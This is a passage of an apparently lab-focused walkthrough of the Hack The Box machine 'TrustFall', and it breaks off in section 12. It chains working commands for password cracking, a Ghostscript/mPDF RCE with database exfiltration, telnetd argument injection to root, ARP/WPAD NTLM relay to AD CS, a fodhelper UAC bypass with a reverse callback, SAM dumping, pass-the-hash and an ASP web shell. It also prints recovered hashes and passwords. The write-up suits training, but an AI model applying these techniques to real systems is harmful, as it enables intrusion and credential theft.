---
layout: post
title: trustfall walkthrough
date: 2026-09-25
---

# {{ title }}


This walkthrough documents the shortest confirmed route through the Hack The Box machine **TrustFall**

The route is:

```plaintext
anonymous FTP
  -> leaked mail hashes and password pattern
  -> Salvador's Roundcube mailbox
  -> osTicket/mPDF file read + Ghostscript RCE
  -> osTicket database attachment containing Martin's SSH key
  -> GNU Inetutils telnetd argument injection -> root on ticket01
  -> private Hyper-V network + WPAD NTLM relay to AD CS
  -> Emma's certificate and RDP session on WS01
  -> writable scheduled-task script + UAC bypass -> WS01 local admin
  -> WS01 SAM hash reuse -> domain user Tom on DC01
  -> writable WSUS web content -> ASP as Network Service
  -> DC01 machine certificate -> DCSync Administrator
  -> root.txt
```

Add the HTTP virtual hosts to `/etc/hosts`:

```bash
printf '%s\n' "$TARGET trustfall.htb ticket.trustfall.htb mailsrv.trustfall.htb" | \
  sudo tee -a /etc/hosts
```

Why: Apache uses name-based virtual hosting. An IP-only request reaches the wrong site, while these names select the main site, osTicket, and Roundcube respectively.

The important tools used below are:

- Nmap and curl for initial enumeration.
- John the Ripper for MD5-Crypt cracking.
- The custom scripts in `tools/` and `probes/` for the osTicket/Ghostscript chain.
- Impacket and Certipy for NTLM relay, certificate authentication, SAM extraction, and DCSync.
- FreeRDP for the WS01 desktop.
- A disposable Windows VM for restoring the Windows Credential Manager backup is **not** required by this shortened path.

## 1. Enumerate the public host

Start with a complete TCP scan, then examine the exposed services in more detail:

```bash
nmap -Pn -n -p- --min-rate 1500 --max-retries 2 -T4 \
  -oA trustfall-full-tcp "$TARGET"

nmap -Pn -n -sV -sC -p21,22,80 --version-all \
  -oA trustfall-services "$TARGET"

nmap -Pn -n -p21,22,80 \
  --script ftp-anon,ftp-syst,http-methods,http-headers,http-robots.txt,http-enum,ssh-auth-methods \
  -oA trustfall-enum "$TARGET"
```

What these do:

- `-Pn` avoids depending on ICMP ping responses.
- `-n` prevents slow DNS lookups.
- `-p-` scans every TCP port rather than only Nmap's default set.
- The second and third scans collect versions, default scripts, FTP anonymous-login status, and HTTP details.

The exposed services are FTP on 21, SSH on 22, and HTTP on 80. FTP permits anonymous authentication.

## 2. Download the leaked mail migration backup

The FTP server advertises an incorrect address in its PASV response. Tell curl to ignore that address and reuse the real control-channel peer:

```bash
mkdir -p loot/mail_migration_backup_2026

curl --ftp-skip-pasv-ip --user anonymous: \
  "ftp://$TARGET/"

curl --ftp-skip-pasv-ip --user anonymous: \
  -o loot/mail_migration_rollback_backup.tar.gz \
  "ftp://$TARGET/mail_migration_rollback_backup.tar.gz"

tar -tzf loot/mail_migration_rollback_backup.tar.gz
tar -xzf loot/mail_migration_rollback_backup.tar.gz \
  -C loot/mail_migration_backup_2026
```

Why: the backup contains both password hashes and the exact corporate password construction:

```plaintext
CompanyName + DEPARTMENT + FirstName + BirthYear + !
```

Normalize the Dovecot records into the `user:hash` form John understands:

```bash
sed -E 's/:\{MD5-CRYPT\}/:/; s/:5000:.*$//' \
  loot/mail_migration_backup_2026/dovecot-users \
  > loot/trustfall-md5crypt.txt
```

Crack Salvador's hash with John (the other recovered hashes are not needed for the foothold):

```bash
python3 trustfall_candidates.py | \
  john --stdin --format=md5crypt-long \
  --users='salvador@trustfall.htb' \
  --session=trustfall-salvador loot/trustfall-md5crypt.txt

john --show --format=md5crypt-long \
  --users='salvador@trustfall.htb' loot/trustfall-md5crypt.txt
```

Why `md5crypt-long`: the generated corporate passwords are longer than the accelerated MD5-Crypt format's usual 15-character limit. The custom candidate generator uses the leaked company, department, first-name, and birth-year structure instead of wasting time on a generic wordlist.

The useful result is:

```plaintext
salvador@trustfall.htb : TrustFallHRSalvador1988!
```

## 3. Establish authenticated access to Roundcube and osTicket

Log into Roundcube at `http://mailsrv.trustfall.htb/` with:

```plaintext
salvador@trustfall.htb
TrustFallHRSalvador1988!
```

On a new machine instance, the osTicket web account does not exist yet. At `http://ticket.trustfall.htb/`, register Salvador with:

```plaintext
Email:    salvador@trustfall.htb
Password: TrustFallPortalSalvador2026!
```

Open the “Welcome to TrustFall Service Desk” message in Salvador's Roundcube inbox and follow its confirmation link. Then log into osTicket with the portal password.

Why both applications matter:

- Roundcube lets us send an EPS attachment and request a thumbnail. That invokes ImageMagick and Ghostscript.
- Authenticated osTicket PDF generation exposes the mPDF arbitrary-file-read primitive. The final exploit uses this file read to discover the live Ghostscript process and its ASLR-dependent memory layout.

## 4. Run the Ghostscript exploit and dump both databases

The custom exploit combines two vulnerabilities:

1. osTicket 1.18.2 with mPDF 8.0.15 permits an authenticated `php://filter` file read when rendering a crafted list-style image into a PDF.
2. Ghostscript 10.02.1 has a signed-integer wrap in its CIDMap processing. Four two-byte underwrites forge a string reference; a final write clears `gs_lib_ctx_core.path_control_active`, allowing `%pipe%` command execution despite `-dSAFER`.

The file-read helper uses Horizon3.ai's CVE-2026-22200 payload generator. Check it out once and verify the expected script is present:

```bash
git clone https://github.com/horizon3ai/CVE-2026-22200.git \
  /tmp/CVE-2026-22200
test -f /tmp/CVE-2026-22200/osticket_ticket_payload_gen.py
```

Why: the repository's TrustFall scripts automate the HTTP and PDF workflow, while this upstream script constructs the vulnerable mPDF list-style payload placed in each ticket.

Run the complete live-calibrated exploit. Use a unique tag, because it becomes part of every temporary filename:

```bash
python3 tools/trustfall_pipe_rce.py \
  --ip "$TARGET" \
  --tag=-solve \
  --verify-calibration \
  --thumbnail-delay 4 \
  --gs-start-delay 1 \
  --pointer-timeout 120 \
  --trigger-timeout 300 \
  --ticket-cooldown 2 \
  --roundcube-cookie /tmp/trustfall-roundcube.cookie \
  --osticket-cookie /tmp/trustfall-osticket.cookie \
  --payload-generator /tmp/CVE-2026-22200/osticket_ticket_payload_gen.py
```

What the command does:

- Logs into both applications with Salvador's credentials.
- Reads `/proc/sys/kernel/ns_last_pid` before and after starting a blocking thumbnail conversion.
- Uses the osTicket file-read oracle to find the new `www-data` Ghostscript process and read `/proc/<pid>/maps`.
- Calibrates a forged reference against a readable ELF mapping instead of assuming fixed ASLR addresses.
- Repoints the forged reference to `heap_start + 0x35bbc`, where this package stores the core path-control flag.
- Clears that flag and invokes `%pipe%`.
- Runs `mysqldump --hex-blob` for both `roundcubemail_db` and `osticket`, compresses the result, and splits it into 30,000-byte chunks.

A successful run ends with a line like:

```plaintext
RCE CONFIRMED: uid=33(www-data) ...
```

Download the manifest first. It contains the exact chunk names for this run, so the procedure remains correct even when the database size differs between machine instances:

```bash
python3 tools/osticket_file_exfil.py \
  --ip "$TARGET" \
  --cookie-jar /tmp/trustfall-osticket.cookie \
  --generator /tmp/CVE-2026-22200/osticket_ticket_payload_gen.py \
  --encoding b64 --batch-size 1 \
  --output loot/trustfall-db-manifest \
  /tmp/trustfall-dbmanifest-solve.txt
```

Extract the remote chunk paths from the manifest and pass that array to the file-read helper:

```bash
MANIFEST=loot/trustfall-db-manifest/rootfs/tmp/trustfall-dbmanifest-solve.txt
mapfile -t DB_CHUNKS < <(
  sed -n '/^\/tmp\/trustfall-dbchunk-solve-[0-9][0-9][0-9]$/p' "$MANIFEST"
)
printf 'Found %d chunks\n' "${#DB_CHUNKS[@]}"

python3 tools/osticket_file_exfil.py \
  --ip "$TARGET" \
  --cookie-jar /tmp/trustfall-osticket.cookie \
  --generator /tmp/CVE-2026-22200/osticket_ticket_payload_gen.py \
  --encoding b64 --batch-size 6 \
  --output loot/trustfall-db-chunks \
  "${DB_CHUNKS[@]}"
```

The manifest also records the expected size and SHA-256 hash. Recreate the array, append the local copies in manifest order, and verify the result:

```bash
mkdir -p loot/trustfall-db
MANIFEST=loot/trustfall-db-manifest/rootfs/tmp/trustfall-dbmanifest-solve.txt
mapfile -t DB_CHUNKS < <(
  sed -n '/^\/tmp\/trustfall-dbchunk-solve-[0-9][0-9][0-9]$/p' "$MANIFEST"
)

: > loot/trustfall-db/trustfall.sql.gz
for remote_chunk in "${DB_CHUNKS[@]}"; do
  cat "loot/trustfall-db-chunks/rootfs/${remote_chunk#/}" \
    >> loot/trustfall-db/trustfall.sql.gz
done

EXPECTED_SHA256=$(sed -n '1s/ .*//p' "$MANIFEST")
printf '%s  %s\n' "$EXPECTED_SHA256" \
  loot/trustfall-db/trustfall.sql.gz | sha256sum -c -
gzip -t loot/trustfall-db/trustfall.sql.gz
gzip -cd loot/trustfall-db/trustfall.sql.gz \
  > loot/trustfall-db/trustfall.sql

rg -n '^-- Current Database:|^-- Dump completed' \
  loot/trustfall-db/trustfall.sql
```

Why split the dump: a single large mPDF response is truncated by osTicket's attachment storage. Small numbered pieces survive intact and can be checked against the target-generated manifest.

## 5. Recover Martin's SSH private key

Search the SQL dump for the support ticket and attachment metadata:

```bash
rg -n -i 'SSH access failing|ssh_debug|ost_file_chunk' \
  loot/trustfall-db/trustfall.sql
```

The useful attachment is osTicket file ID 4. Extract only that BLOB, identify it, and unpack it:

```bash
mkdir -p loot/osticket-files loot/martin-key

python3 tools/extract_osticket_files.py \
  --ids 4 \
  loot/trustfall-db/trustfall.sql \
  loot/osticket-files

file loot/osticket-files/ost_file_04.bin
cp loot/osticket-files/ost_file_04.bin \
  loot/martin-key/ssh_debug.tar.gz

tar -xzf loot/martin-key/ssh_debug.tar.gz \
  -C loot/martin-key

chmod 600 loot/martin-key/.ssh/id_ed25519
ssh-keygen -lf loot/martin-key/.ssh/id_ed25519
```

Why trust this key: the private key is unencrypted, its derived public key matches both the included `.pub` file and `authorized_keys`, and its comment identifies `martin@ticket01`.

Log in:

```bash
export KEY="$PWD/loot/martin-key/.ssh/id_ed25519"

ssh -o StrictHostKeyChecking=no \
  -i "$KEY" martin@"$TARGET"
```

Confirm the foothold:

```bash
id
hostname
```

Expected identity: `uid=1000(martin)` on `ticket01`.

## 6. Escalate to root on ticket01

TCP/23 is filtered from the VPN, but Martin can reach the local Telnet daemon. GNU Inetutils passes the Telnet `USER` environment value as arguments to `/bin/login`. Supplying `USER="-f root"` therefore turns the value into login options rather than a username.

Run this from the attacker machine:

```bash
ssh -tt -o StrictHostKeyChecking=no \
  -i "$KEY" martin@"$TARGET" \
  'env USER="-f root" TERM=xterm /usr/local/bin/telnet -a 127.0.0.1 23'
```

Then verify the new shell:

```bash
id
whoami
```

Expected result:

```plaintext
uid=0(root) gid=0(root) groups=0(root)
```

Why it works: Telnet automatic login sends the attacker-controlled `USER` value through NEW-ENVIRON. `telnetd` constructs `/bin/login -p -h <host> -f root`; login interprets `-f root` as “authenticate root without asking for a password.” This is argument injection, not shell metacharacter injection.

The Linux root shell is an intermediate pivot. The HTB user flag is on WS01, not in `/home/martin`.

## 7. Discover and prepare the private Hyper-V network

In the root Telnet shell, bring up the dormant NIC and assign the known unused pivot address:

```bash
ip link set eth0 up
ip address add 192.168.1.116/24 dev eth0 2>/dev/null || true
ip -br address show dev eth0

tcpdump -ni eth0 'arp or tcp'
```

The relevant private systems are:

| Host | Address | Purpose |
|---|---:|---|
| ticket01 | `192.168.1.116` | Compromised Linux pivot |
| DC01 | `192.168.1.32` | Domain controller and AD CS server |
| WS01 | `192.168.1.64` | User workstation containing the user flag |
| WS02 | `192.168.1.37` | Offline workstation address, safe to impersonate |

Passive traffic shows WS01 repeatedly looking for the absent WS02. Claim that unused address:

```bash
ip address add 192.168.1.37/24 dev eth0 2>/dev/null || true
ip -br address show dev eth0
```

Copy the two narrowly scoped interception helpers to ticket01 from the attacker machine:

```bash
scp -i "$KEY" \
  tools/arp_mitm_pair.py tools/wpad_dns_spoof.py \
  martin@"$TARGET":/tmp/
```

The private network has no direct route from the attacker and ticket01 has no PyPI access. Build a Python 3.12 wheelhouse locally, copy it to Martin's home directory, and create the pivot tool environment there:

```bash
mkdir -p loot/trustfall-pivot-wheels

python3 -m pip download \
  --dest loot/trustfall-pivot-wheels \
  --python-version 312 \
  --platform manylinux_2_17_x86_64 \
  --implementation cp \
  --only-binary=:all: \
  'impacket==0.13.1' 'certipy-ad==5.0.4'

scp -i "$KEY" -r loot/trustfall-pivot-wheels \
  martin@"$TARGET":/home/martin/

ssh -i "$KEY" martin@"$TARGET" '
  python3 -m venv /home/martin/trustfall-venv
  /home/martin/trustfall-venv/bin/pip install \
    --no-index \
    --find-links /home/martin/trustfall-pivot-wheels \
    "impacket==0.13.1" "certipy-ad==5.0.4"
'
```

The supplied workspace also contains the compatibility fix used during the solve. Copy it over Impacket's AD CS relay module:

```bash
scp -i "$KEY" \
  tools/impacket-patched/impacket/examples/ntlmrelayx/attacks/httpattacks/adcsattack.py \
  martin@"$TARGET":/home/martin/trustfall-venv/lib/python3.12/site-packages/impacket/examples/ntlmrelayx/attacks/httpattacks/adcsattack.py

ssh -i "$KEY" martin@"$TARGET" '
  /home/martin/trustfall-venv/bin/ntlmrelayx.py -h >/dev/null
  /home/martin/trustfall-venv/bin/certipy -v
'
```

Why: `ntlmrelayx.py`, `smbclient.py`, `secretsdump.py`, `changepasswd.py`, and Certipy must run on ticket01 so they can reach `192.168.1.0/24`. The replacement AD CS module avoids the removed legacy pyOpenSSL CSR API when the relay generates its certificate request.

## 8. Relay Emma's WPAD authentication to AD CS

This is the key lateral-movement step. WS01 periodically performs proxy auto-discovery. We place ticket01 between WS01 and DC01 using ARP replies, answer only `wpad.trustfall.htb`, serve a PAC file, and relay the later proxy authentication to AD CS Web Enrollment.

### Start the AD CS relay

Start the relay from a normal Martin SSH session using the environment staged above. Running it as Martin keeps the resulting PFX readable and easy to copy back:

```bash
ssh -i "$KEY" martin@"$TARGET" '
  mkdir -p /tmp/trustfall-wpad/loot
  cd /tmp/trustfall-wpad
  nohup sh -c '\''tail -f /dev/null | \
    /home/martin/trustfall-venv/bin/ntlmrelayx.py \
      -ts -debug \
      -ip 0.0.0.0 --http-port 8080 \
      --no-smb-server --no-wcf-server --no-raw-server --no-rpc-server \
      --no-winrm-server --no-mssql-server --no-rdp-server \
      --keep-relaying \
      -wh 192.168.1.37 -wa 0 \
      -t https://192.168.1.32/certsrv/certfnsh.asp \
      --adcs \
      -l /tmp/trustfall-wpad/loot'\'' \
    > /tmp/trustfall-wpad/relay.log 2>&1 &
'
```

Important options:

- `-wa 0` serves `wpad.dat` without asking for credentials. Patched Windows clients refuse to authenticate while downloading the PAC itself; authentication happens on the later proxied request.
- No `--template` is supplied. Impacket must choose `User` for Emma and `Machine` for computer accounts automatically.
- The target is the HTTPS AD CS enrollment page on DC01, an ESC8-style NTLM relay destination.

### Intercept only the needed traffic

In the root Telnet shell, enable same-interface forwarding and add narrow rules:

```bash
sysctl -w net.ipv4.ip_forward=1

iptables -I FORWARD 1 -i eth0 -o eth0 \
  -s 192.168.1.64 -d 192.168.1.32 -j ACCEPT
iptables -I FORWARD 1 -i eth0 -o eth0 \
  -s 192.168.1.32 -d 192.168.1.64 -j ACCEPT

iptables -I INPUT 1 -i eth0 \
  -s 192.168.1.64 -d 192.168.1.37 \
  -p tcp -m multiport --dports 80,8080 -j ACCEPT

iptables -I FORWARD 1 -i eth0 -o eth0 \
  -s 192.168.1.32 -d 192.168.1.64 \
  -p udp --sport 53 -m string --algo bm --string wpad -j DROP

iptables -t nat -I PREROUTING 1 -i eth0 \
  -s 192.168.1.64 -d 192.168.1.37 \
  -p tcp --dport 80 -j REDIRECT --to-ports 8080
```

Why: ARP MITM makes WS01/DC01 traffic traverse ticket01. The input rule admits only WS01's PAC and proxy connections to the impersonated address. The DNS-response rule drops only DC01's competing answer when the query contains `wpad`; the custom spoofer then wins that single lookup. The NAT rule redirects only WS01's HTTP connection to the impersonated WS02 address.

Start the ARP and DNS helpers as root:

```bash
nohup python3 /tmp/arp_mitm_pair.py \
  --iface eth0 \
  --a-ip 192.168.1.64 --a-mac 00:15:5d:b3:46:01 \
  --b-ip 192.168.1.32 --b-mac 00:15:5d:b3:46:04 \
  --interval 1 \
  > /tmp/trustfall-wpad-arp.log 2>&1 &

nohup python3 /tmp/wpad_dns_spoof.py \
  --iface eth0 \
  --victim-ip 192.168.1.64 --victim-mac 00:15:5d:b3:46:01 \
  --dns-ip 192.168.1.32 \
  --name wpad.trustfall.htb \
  --answer 192.168.1.37 \
  > /tmp/trustfall-wpad-dns.log 2>&1 &
```

Force a short connectivity transition so Windows reruns NCSI and WPAD instead of keeping its previous negative DNS cache:

```bash
iptables -I FORWARD 1 -i eth0 -o eth0 \
  -s 192.168.1.64 -d 192.168.1.32 -j DROP
iptables -I FORWARD 1 -i eth0 -o eth0 \
  -s 192.168.1.32 -d 192.168.1.64 -j DROP

sleep 45

iptables -D FORWARD -i eth0 -o eth0 \
  -s 192.168.1.64 -d 192.168.1.32 -j DROP
iptables -D FORWARD -i eth0 -o eth0 \
  -s 192.168.1.32 -d 192.168.1.64 -j DROP
```

Watch the relay from the attacker machine:

```bash
ssh -i "$KEY" martin@"$TARGET" \
  'tail -f /tmp/trustfall-wpad/relay.log'
```

Allow up to about ten minutes for the next proxy-discovery cycle. Success looks like:

```plaintext
Authenticating connection from TRUSTFALL/EMMA.WILLIAMS@192.168.1.64 ... SUCCEED
Using template name: User
GOT CERTIFICATE!
Writing PKCS#12 certificate to .../EMMA.WILLIAMS.pfx
```

Copy the certificate back:

```bash
mkdir -p loot/trustfall-wpad
scp -i "$KEY" \
  martin@"$TARGET":/tmp/trustfall-wpad/loot/EMMA.WILLIAMS.pfx \
  loot/trustfall-wpad/EMMA.WILLIAMS.pfx
```

### Convert Emma's certificate into a usable password

Copy the PFX to ticket01 and authenticate directly to the private DC:

```bash
scp -i "$KEY" loot/trustfall-wpad/EMMA.WILLIAMS.pfx \
  martin@"$TARGET":/tmp/EMMA.WILLIAMS.pfx

ssh -i "$KEY" martin@"$TARGET" '
  cd /tmp
  /home/martin/trustfall-venv/bin/certipy auth \
    -pfx /tmp/EMMA.WILLIAMS.pfx \
    -dc-ip 192.168.1.32 \
    -username emma.williams \
    -domain trustfall.htb
'
```

Certipy uses PKINIT to obtain a TGT, then retrieves Emma's NT hash through the Kerberos user-to-user mechanism. The recovered hash was:

```plaintext
9148a2275eb4cb620a76557b2512993f
```

Emma's account was marked for password change, so set a known password through authenticated SAMR:

```bash
ssh -i "$KEY" martin@"$TARGET" '
  /home/martin/trustfall-venv/bin/changepasswd.py \
    -protocol smb-samr \
    -hashes aad3b435b51404eeaad3b435b51404ee:9148a2275eb4cb620a76557b2512993f \
    -newpass '\''TrustFall!Emma2026#RDP'\'' \
    '\''TRUSTFALL/emma.williams@192.168.1.32'\''
'
```

Why change it: certificate authentication proves control of the AD account, but Windows blocks an interactive RDP logon while the password-expired/change-required flag is set. A self-service password change clears that condition.

Stop the relay and poisoning helpers after obtaining the PFX. Keep the `.37` address because the later payload uses it as its callback address:

```bash
# Run in the ticket01 root shell.
pkill -f 'arp_mitm_pair.py' 2>/dev/null || true
pkill -f 'wpad_dns_spoof.py' 2>/dev/null || true
pkill -f 'ntlmrelayx.py.*http-port 8080' 2>/dev/null || true

iptables -t nat -D PREROUTING -i eth0 \
  -s 192.168.1.64 -d 192.168.1.37 \
  -p tcp --dport 80 -j REDIRECT --to-ports 8080
iptables -D FORWARD -i eth0 -o eth0 \
  -s 192.168.1.32 -d 192.168.1.64 \
  -p udp --sport 53 -m string --algo bm --string wpad -j DROP
iptables -D INPUT -i eth0 \
  -s 192.168.1.64 -d 192.168.1.37 \
  -p tcp -m multiport --dports 80,8080 -j ACCEPT
```

## 9. RDP to WS01 as Emma

Create local forwards through Martin's SSH session:

```bash
ssh -fN \
  -o ExitOnForwardFailure=yes \
  -o ServerAliveInterval=15 \
  -o StrictHostKeyChecking=no \
  -i "$KEY" \
  -L 13390:192.168.1.64:3389 \
  -L 15987:192.168.1.32:5985 \
  -L 18530:192.168.1.32:8530 \
  martin@"$TARGET"
```

Why: the Windows hosts are not reachable from the VPN. SSH carries RDP, WinRM, and the WSUS HTTP site through ticket01.

Connect to WS01:

```bash
mkdir -p loot/trustfall-emma-rdp

xfreerdp3 \
  /v:127.0.0.1:13390 \
  /u:emma.williams /d:TRUSTFALL \
  '/p:TrustFall!Emma2026#RDP' \
  /cert:ignore /sec:nla \
  '/auth-pkg-list:ntlm,!kerberos,!u2u' \
  /dynamic-resolution +clipboard \
  /drive:loot,"$PWD/loot/trustfall-emma-rdp"
```

The `/drive` option makes the local loot directory available in Windows as `\\tsclient\loot`, which gives us a simple way to stage the WS01 privilege-escalation payload.

## 10. Abuse `TASK01` and obtain the user flag

Open PowerShell in Emma's RDP session and enumerate the custom task:

```powershell
Get-ScheduledTask -TaskName TASK01 | Format-List *
Export-ScheduledTask -TaskName TASK01
icacls 'C:\Users\ws01\Music\script01.ps1'
```

The decisive facts are:

- `TASK01` runs every minute as local account `WS01\ws01`.
- `WS01\ws01` belongs to the local Administrators group.
- Emma has full control over `C:\Users\ws01\Music\script01.ps1`.
- The task uses a limited split token, so the script must cross UAC before the resulting shell is high integrity.

Compile the provided callback on the attacker machine if the executable is not already present:

```bash
x86_64-w64-mingw32-gcc -Os -s -mwindows \
  loot/trustfall-emma-rdp/diagnostic4445.c \
  -o loot/trustfall-emma-rdp/diagnostic4445.exe \
  -lws2_32
```

The provided `task01-lpe.ps1` creates the per-user `ms-settings\Shell\Open\command` handler and launches auto-elevating `fodhelper.exe`. Fodhelper starts `diagnostic4445.exe` with the high-integrity half of the local administrator's split token.

ticket01 has no Netcat package, so copy the attack machine's statically linked BusyBox binary there under the name `nc`:

```bash
file /usr/sbin/busybox
scp -i "$KEY" /usr/sbin/busybox martin@"$TARGET":/tmp/nc
ssh -i "$KEY" martin@"$TARGET" 'chmod 700 /tmp/nc'
```

Why the filename matters: BusyBox is a multi-call binary and chooses its applet from `argv[0]`. Naming the copy `nc` makes a normal `/tmp/nc ...` invocation run its Netcat implementation. Confirm that `file` reports a statically linked x86-64 binary before copying it, so it does not depend on libraries absent from ticket01.

Allow the callback through ticket01's firewall and start a listener from the root shell:

```bash
iptables -I INPUT 1 -i eth0 -s 192.168.1.64 \
  -d 192.168.1.37 -p tcp --dport 4445 -j ACCEPT

/tmp/nc -nvl -s 192.168.1.37 -p 4445
```

Back in Emma's PowerShell window, preserve the original task script, copy the two payload files from the redirected drive, and replace the task script:

```powershell
Copy-Item 'C:\Users\ws01\Music\script01.ps1' 'C:\Users\Public\script01.original.ps1' -Force
Copy-Item '\\tsclient\loot\diagnostic4445.exe' 'C:\Users\Public\diagnostic4445.exe' -Force
Copy-Item '\\tsclient\loot\task01-lpe.ps1' 'C:\Users\ws01\Music\script01.ps1' -Force
```

Wait for the next one-minute trigger. In the callback shell, verify that UAC was crossed:

```cmd
whoami
whoami /groups
whoami /priv
```

Look for `BUILTIN\Administrators` enabled, `High Mandatory Level`, and enabled `SeDebugPrivilege`/`SeImpersonatePrivilege`.

Restore the original script immediately, then read the user flag:

```cmd
copy /Y C:\Users\Public\script01.original.ps1 C:\Users\ws01\Music\script01.ps1
type C:\Users\Administrator\Desktop\user.txt
```

The recovered user flag was:

```plaintext
273918993378b39afcb3ef3478783f4b
```

## 11. Dump WS01's local SAM and pivot to Tom

From the same high-integrity WS01 shell, save the registry hives needed for offline SAM decryption:

```cmd
reg save HKLM\SAM C:\Users\Public\SAM.hive /y
reg save HKLM\SYSTEM C:\Users\Public\SYSTEM.hive /y
reg save HKLM\SECURITY C:\Users\Public\SECURITY.hive /y

powershell -NoProfile -Command "Compress-Archive -Force -Path C:\Users\Public\SAM.hive,C:\Users\Public\SYSTEM.hive,C:\Users\Public\SECURITY.hive -DestinationPath C:\Users\Public\ws01-hives.zip"
```

Start the repository's minimal HTTP PUT receiver on ticket01. Run this from a Martin SSH shell and allow it through the root firewall:

```bash
# As root on ticket01:
iptables -I INPUT 1 -i eth0 -s 192.168.1.64 \
  -d 192.168.1.37 -p tcp --dport 18002 -j ACCEPT

# From the attacker machine:
scp -i "$KEY" tools/http_put_server.py martin@"$TARGET":/tmp/
ssh -i "$KEY" martin@"$TARGET" \
  'mkdir -p /tmp/ws01-upload && python3 /tmp/http_put_server.py --bind 192.168.1.37 --port 18002 --output-dir /tmp/ws01-upload'
```

The final SSH command stays in the foreground to show each upload. Leave it running in its own terminal; use a second terminal for the following `scp` and extraction commands.

Upload the archive from the WS01 administrator shell:

```cmd
curl.exe -T C:\Users\Public\ws01-hives.zip http://192.168.1.37:18002/ws01-hives.zip
```

Copy it to the attacker and decrypt the SAM:

```bash
mkdir -p loot/trustfall-ws01-admin/hives

scp -i "$KEY" \
  martin@"$TARGET":/tmp/ws01-upload/ws01-hives.zip \
  loot/trustfall-ws01-admin/ws01-hives.zip

unzip -o loot/trustfall-ws01-admin/ws01-hives.zip \
  -d loot/trustfall-ws01-admin/hives

secretsdump.py \
  -sam loot/trustfall-ws01-admin/hives/SAM.hive \
  -system loot/trustfall-ws01-admin/hives/SYSTEM.hive \
  -security loot/trustfall-ws01-admin/hives/SECURITY.hive \
  LOCAL
```

The important local entry is:

```plaintext
tom.k-local:1004:aad3b435b51404eeaad3b435b51404ee:dff29eb8bccf74240556221ef322573e:::
```

The naming is a clue. Test the local Tom hash against the similarly named domain account on DC01. Run the client on ticket01 because DC01 is reachable only from the private network:

```bash
ssh -i "$KEY" martin@"$TARGET" '
  /home/martin/trustfall-venv/bin/smbclient.py \
    -hashes aad3b435b51404eeaad3b435b51404ee:dff29eb8bccf74240556221ef322573e \
    -no-pass -inputfile /dev/null \
    '\''TRUSTFALL/tom.k@192.168.1.32'\''
'
```

`-inputfile /dev/null` makes the client exit after authentication instead of opening its interactive mini-shell. Seeing no logon error confirms that the reused hash is valid.

Why it works: the password is reused between two distinct principals—local `WS01\tom.k-local` and domain `TRUSTFALL\tom.k`. Domain Tom is a member of DC01's Remote Management Users, so the reused NT hash gives a WinRM shell on the domain controller.

Create a small Python environment for the supplied PSRP pass-the-hash helper:

```bash
python3 -m venv /tmp/trustfall-psrp
/tmp/trustfall-psrp/bin/pip install pypsrp
```

Use the existing `15987` SSH forward to verify DC01 access:

```bash
NO_PROXY='*' /tmp/trustfall-psrp/bin/python \
  tools/psrp_hash_exec.py \
  --server 127.0.0.1 --port 15987 \
  --username 'TRUSTFALL\tom.k' \
  --hashes 'aad3b435b51404eeaad3b435b51404ee:dff29eb8bccf74240556221ef322573e' \
  'hostname; whoami; whoami /groups'
```

Expected host and identity: `DC01` and `trustfall\tom.k`.

## 12. Turn writable WSUS content into DC01's machine certificate

Tom is not an administrator, but `BUILTIN\Users` can create files and directories under the WSUS content root. Confirm that from the WinRM session:

```bash
NO_PROXY='*' /tmp/trustfall-psrp/bin/python \
  tools/psrp_hash_exec.py \
  --server 127.0.0.1 --port 15987 \
  --username 'TRUSTFALL\tom.k' \
  --hashes 'aad3b435b51404eeaad3b435b51404ee:dff29eb8bccf74240556221ef322573e' \
  'icacls "C:\WSUS\WsusContent"; New-Item -ItemType Directory -Force "C:\WSUS\WsusContent\tf-dc01-cert" | Out-Null'
```

The directory is exposed by IIS beneath `http://localhost:8530/Content/`. Static content works immediately, but ASP is initially denied. A child `web.config` can enable the already installed script handler for only our directory.

### Generate a key and CSR locally

Keep the private key on the attacker machine. Only the CSR needs to reach DC01:

```bash
mkdir -p loot/trustfall-dc01-cert

openssl req -new -newkey rsa:2048 -nodes \
  -keyout loot/trustfall-dc01-cert/dc01.key \
  -out loot/trustfall-dc01-cert/dc01.req \
  -subj '/CN=dc01.trustfall.htb'
```

Why generate it locally: the IIS worker only needs to submit the public CSR. Retaining the private key lets us combine it with the returned certificate without depending on the worker's certificate store.

Create the three small web files locally:

```bash
cat > /tmp/trustfall-web.config <<'EOF'
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script" />
  </system.webServer>
</configuration>
EOF

cat > /tmp/trustfall-submit.cmd <<'EOF'
@echo off
certreq.exe -submit -config "dc01.trustfall.htb\trustfall-DC01-CA" -attrib "CertificateTemplate:KerberosAuthentication" "C:\WSUS\WsusContent\tf-dc01-cert\dc01.req" "C:\WSUS\WsusContent\tf-dc01-cert\dc01-issued.cer" > "C:\WSUS\WsusContent\tf-dc01-cert\submit.log" 2>&1
exit /b %errorlevel%
EOF

cat > /tmp/trustfall-submit.asp <<'EOF'
<%
Set shell = CreateObject("WScript.Shell")
rc = shell.Run("cmd.exe /c C:\WSUS\WsusContent\tf-dc01-cert\submit.cmd", 0, True)
Response.ContentType = "text/plain"
Response.Write("exit=" & rc)
%>
EOF
```

Push the files through Tom's WinRM session:

```bash
for spec in \
  '/tmp/trustfall-web.config|C:\WSUS\WsusContent\tf-dc01-cert\web.config' \
  '/tmp/trustfall-submit.cmd|C:\WSUS\WsusContent\tf-dc01-cert\submit.cmd' \
  '/tmp/trustfall-submit.asp|C:\WSUS\WsusContent\tf-dc01-cert\submit.asp' \
  'loot/trustfall-dc01-cert/dc01.req|C:\WSUS\WsusContent\tf-dc01-cert\dc01.req'
do
  local_path=${spec%%|*}
  remote_path=${spec#*|}
  NO_PROXY='*' /tmp/trustfall-psrp/bin/python \
    tools/psrp_hash_push.py \
    --server 127.0.0.1 --port 15987 \
    --username 'TRUSTFALL\tom.k' \
    --hashes 'aad3b435b51404eeaad3b435b51404ee:dff29eb8bccf74240556221ef322573e' \
    "$local_path" "$remote_path"
done
```

Trigger the ASP page from DC01 itself:

```bash
NO_PROXY='*' /tmp/trustfall-psrp/bin/python \
  tools/psrp_hash_exec.py \
  --server 127.0.0.1 --port 15987 \
  --username 'TRUSTFALL\tom.k' \
  --hashes 'aad3b435b51404eeaad3b435b51404ee:dff29eb8bccf74240556221ef322573e' \
  'cmd.exe /c "curl.exe -sS --max-time 45 http://localhost:8530/Content/tf-dc01-cert/submit.asp & type C:\WSUS\WsusContent\tf-dc01-cert\submit.log"'
```

Expected output includes:

```plaintext
exit=0
RequestId: 17
Certificate retrieved(Issued) Issued
```

Why this becomes the DC machine identity:

